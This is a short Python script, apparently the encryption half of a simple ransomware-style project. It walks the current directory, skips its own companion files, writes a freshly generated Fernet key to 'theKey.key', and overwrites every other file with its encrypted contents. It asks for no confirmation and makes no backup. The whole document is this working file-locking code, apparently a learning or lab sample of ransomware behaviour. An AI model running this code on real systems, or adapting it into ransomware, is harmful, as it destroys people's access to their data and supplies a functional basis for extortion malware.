#!/usr/bin/python3
import os
from cryptography.fernet import Fernet

#Files to be encrypted...
files = []
for file in os.listdir():
    if ((file != "encrypt.py")and(file != "theKey.key")and(file != "decrypt.py")and(file != "main.py")):
        if os.path.isfile(file):
            files.append(file)

#Generating the encryption Key...
key = Fernet.generate_key()
with open("theKey.key", "wb") as the_key:
    the_key.write(key)

#Encrpyption...
for file in files:
    with open(file, "rb") as theFile:
        content = theFile.read()
        encrypted_content = Fernet(key).encrypt(content)
        with open(file, "wb") as theFile:
            theFile.write(encrypted_content)


print("Files at the location " + os.getcwd() + " are encrypted..!")